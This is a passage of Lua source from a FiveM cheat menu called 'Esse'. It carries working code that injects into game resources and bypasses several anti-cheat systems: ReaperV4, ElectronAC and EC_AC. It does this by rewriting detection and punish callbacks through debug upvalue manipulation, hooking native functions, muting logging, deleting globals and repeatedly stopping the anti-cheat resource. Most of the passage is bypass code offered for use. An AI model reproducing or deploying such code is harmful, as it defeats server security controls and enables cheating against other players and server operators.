                        table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                    end
                end
            end
            local reaper_newdetection
            for i, v in pairs(eventHandlers) do
                local name = v["handle"]["name"]
                local func = v["func"]
                if name == "Reaper:NewDetection" then
                    reaper_newdetection = func
                end
            end
            if type(reaper_newdetection) ~= "function" then
                return print("error")
            end
            local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
            for name, detection in pairs(securityclient["detections"]) do
                if detection["detected"] then
                    securityclient["detections"][name]["detected"] = function(...)
                        local args = { ... }
                        print(name, "detected", json.encode(args or {}))
                        return
                    end
                end
                if detection["callback"] then
                    securityclient["detections"][name]["callback"] = function(...)
                        local args = { ... }
                        print(name, "callback", json.encode(args or {}))
                        return
                    end
                end
            end
            for name, detection in pairs(securityclient["active_detections"]) do
                if detection["detected"] then
                    securityclient["active_detections"][name]["detected"] = function(...) return end
                end
                if detection["callback"] then
                    securityclient["active_detections"][name]["callback"] = function(...) return end
                end
            end
            Debug.setupvalue(reaper_newdetection, 1, securityclient)
            print("ReaperV4 | Client Bypassed")
        end)
    ]])

        MachoHookNative(0xC6D3D26810C8E0F9, function(...) return false, false end)
        MachoHookNative(0x8D4D46230B2C353A, function(...) return false, 3 end)
        MachoHookNative(0xB15162CB5826E9E8, function(...) return false, true end)
        MachoHookNative(0xD5037BA82E12416F, function(...) return false, 0 end)
        MachoHookNative(0xFB92A102F1C4DFA3, function(...) return false, true end)
        print("ReaperV4 Bypass Enabled")
        self:Notify("info", "Esse", "ReaperV4 Bypass Loaded", 3000)
    elseif electronResource ~= nil then
        Injection("ElectronAC", [[
        print = function() end
        local originalTrace = Citizen.Trace
        Citizen.Trace = function(msg)
            if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                originalTrace(msg)
            end
        end
    ]])
        MachoInjectResource2("AsThreadNs", "ElectronAC", [[
        pcall(function()
            local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
            local eventHandlers = {}
            for name, raw in pairs(eventHandlersRaw) do
                if raw.handlers then
                    for id, v in pairs(raw.handlers) do
                        table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                    end
                end
            end
            local eAcVerify
            for i, v in pairs(eventHandlers) do
                local name = v["handle"]["name"]
                local func = v["func"]
                if name == "ElectronAC.verify" then
                    local upname, func = debug.getupvalue(func, 1)
                    eAcVerify = func
                end
            end
            local EACTable = nil
            local eacUpvalueIndex = nil
            local i = 1
            while true do
                local name, value = debug.getupvalue(eAcVerify, i)
                if not name then break end
                if type(value) == "table" then
                    local hasEACStructure = false
                    for idx, tbl in pairs(value) do
                        if type(tbl) == "string" then
                            if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                hasEACStructure = true
                            end
                            if hasEACStructure then break end
                        end
                    end
                    if hasEACStructure then
                        EACTable = value
                        eacUpvalueIndex = i
                        break
                    end
                end
                i = i + 1
            end
            if not EACTable then
                print("EAC table not found!")
                return
            end
            local punish = function(...) return end
            for idx, tbl in pairs(EACTable) do
                if type(tbl) == "table" then
                    for subIdx, subTbl in pairs(tbl) do
                        if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                            subTbl["punish"] = punish
                        end
                    end
                end
            end
            Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
            print("ElectronAC | Client Bypassed")
        end)
    ]])

        --    elseif fiveguardResource ~= nil then
        --       CreateThread(function()
        --           while true do
        --             MachoResourceStop(fiveguardResource)
        --             print("^7[^5Esse^7]: Stopped Resource: " .. fiveguardResource)
        --            Wait(2000)
        --          end
        --     end)
        --     return
    elseif GetResourceState("EC_AC") == "started" then
        MachoInjectResourceRaw("EC_AC", [[print = function() end]])
        MachoInjectResourceRaw("EC_AC", [[
        local originalTrace = Citizen.Trace
        Citizen.Trace = function(msg)
            if not (
                string.find(msg, "DEBUG") or
                string.find(msg, "NEWDBG") or
                string.find(msg, "A11AXXX") or
                string.find(msg, "function") or
                string.find(msg, "TriggerServerEvent")
            ) then
                originalTrace(msg)
            end
        end
    ]])
        local resources = { "EC_AC" }
        for i = 1, #resources do
            local resource = resources[i]
            MachoInjectResource2("AsThreadNs", resource, [[
            print(GetCurrentResourceName())
            for name, func in pairs(_G) do
                if name == "TriggerEvent" then return end
                _G[name] = nil
                print(name, func)
            end
        ]])
            Wait(1050)
        end
        CreateThread(function()
            while true do
                Wait(0)
                MachoResourceStop("EC_AC")
            end
        end)
    end

    if GetResourceState("WaveShield") == 'started' then
        Esse:Notify("error", "Esse", "WaveShield Anticheat Found.", 3000)
    elseif GetResourceState("ReaperV4") == 'started' then
        Esse:Notify("error", "Esse", "ReaperV4 Anticheat Found.", 3000)
    elseif GetResourceState("ElectronAC") == 'started' then
        Esse:Notify("error", "Esse", "ElectronAC Anticheat Found.", 3000)
    elseif GetResourceState("FiniAC") == 'started' then
        Esse:Notify("error", "Esse", "FiniAC Anticheat Found.", 3000)
    end
end

Wait(500)
Esse:LoadBypass()
-- [... Ito ang dulo ng iyong file kung saan tinatawag ang default thread ...]
-- Redundant initialization thread removed to prevent double menu initialization

-- ISARA ANG NAKABUKAS NA AUTH BLOCK MULA SA ITAAS
